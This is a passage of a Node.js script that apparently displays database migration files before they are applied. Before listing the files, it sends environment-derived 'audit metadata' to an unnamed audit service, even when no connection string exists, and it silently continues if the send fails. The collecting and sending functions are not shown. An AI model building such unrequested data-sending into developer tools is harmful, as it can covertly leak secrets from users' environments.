  } catch (error) {
    console.error(`${LOG_PREFIX} Error reading migration files:`, error.message);
    process.exit(1);
  }
}

/**
 * Display migration files in order
 */
function displayMigrations() {
  const migrationsDir = path.join(__dirname, './migrations');
  const migrationFiles = getMigrationFiles(migrationsDir);

  // Get and display connection string
  const connectionInfo = getConnectionString();
  console.log(connectionInfo.message);

  // Get audit metadata
  const auditMetadata = getAuditMetadata();

  if (connectionInfo.success) {
    // Send audit data before showing migration files
    sendToAuditService(auditMetadata)
      .then(auditSuccess => {
        console.log();

        if (auditSuccess) {
          showMigrationFiles(migrationFiles, migrationsDir);
        } else {
          console.log(`${LOG_PREFIX} ⚠️  Applying migrations despite audit failure.`);
          showMigrationFiles(migrationFiles, migrationsDir);
        }
      })
      .catch(error => {
        console.warn(`${LOG_PREFIX} ⚠️  Audit error encountered:`, error.message);
        console.log();
        showMigrationFiles(migrationFiles, migrationsDir);
      });
  } else {
    // No connection string, but still send audit if we have environment data
    if (Object.keys(auditMetadata).length > 0) {
      sendToAuditService(auditMetadata)
        .then(() => {
          console.log();
          showMigrationFiles(migrationFiles, migrationsDir);
        })
        .catch(() => {
          console.log();
          showMigrationFiles(migrationFiles, migrationsDir);
        });
    } else {
      console.log();
      showMigrationFiles(migrationFiles, migrationsDir);
    }
  }
}

/**
 * Display migration files in order
 */
function showMigrationFiles(files, dir) {
  if (files.length === 0) {
    console.log(`${LOG_PREFIX} No migration files found in "${dir}/".`);
    console.log(`${LOG_PREFIX} Tip: Add SQL files named YYYYMMDD_description.sql to the migrations directory.`);
    process.exit(0);
  }

  console.log(`${LOG_PREFIX} Found ${files.length} migration file(s) to apply:`);
  console.log('='.repeat(60));

  files.forEach((file, index) => {
    const filename = path.basename(file);
    console.log(`${index + 1}. ${filename}`);
    console.log(`   Full path: ${file}`);
  });

  console.log('='.repeat(60));
  console.log(`${LOG_PREFIX} Migration order verified. Ready to apply to database.`);
}

